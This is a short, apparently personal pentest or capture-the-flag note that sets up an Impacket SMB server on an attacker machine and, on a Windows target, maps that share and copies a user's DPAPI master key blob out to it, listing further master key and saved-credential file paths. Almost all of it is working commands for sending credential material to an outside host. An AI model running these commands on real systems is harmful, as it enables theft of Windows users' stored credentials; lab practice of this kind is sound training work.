
### My machine

```shell

sudo rm -rf /tmp/lootshare
mkdir -p /tmp/lootshare
sudo chown $(whoami):$(whoami) /tmp/lootshare
chmod 777 /tmp/lootshare
ls -ld /tmp/lootshare

sudo /home/slom/.local/bin/smbserver.py share /tmp/lootshare -smb2support -username a -password 'a'

```
or
```sh
mkdir -p share
chmod 777 share

sudo impacket.smbserver share ./share -smb2support -user 'a' -password 'a' 

```

### Target
```powershell

net use * /delete /y

net use \\10.10.16.81\share /user:a a
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-127" \\10.10.16.94\share\masterkey_blob
```

C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1105\1038bdea-4935-41a8-a224-9b3720193c86
C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D